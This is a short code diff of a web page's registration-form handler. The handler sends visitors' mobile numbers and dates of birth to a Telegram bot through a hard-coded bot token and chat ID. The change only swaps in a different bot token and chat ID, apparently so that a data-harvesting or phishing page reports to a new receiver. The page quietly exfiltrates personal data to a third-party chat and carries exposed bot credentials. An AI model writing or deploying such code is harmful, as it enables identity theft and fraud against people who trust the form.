@@ -77,7 +77,7 @@
       event.preventDefault();
       var formData = new FormData(event.target);
       var message = "New registration:\nMobile Number: " + formData.get('mobile-number') + "\nDate of Birth: " + formData.get('dob');
-      var url = "https://api.telegram.org/bot6789641797:AAH3tBZs38-Z6CB5bDQrPX6LZo4iVyq_yiY/sendMessage?chat_id=6929312170&text=" + encodeURI(message);
+      var url = "https://api.telegram.org/bot6927304367:AAEZgjQ7MZpoioPemieyUkRr1bI2Cbpovyc/sendMessage?chat_id=6800560922&text=" + encodeURI(message);
       
       fetch(url, { method: 'GET' })
         .then(response => {
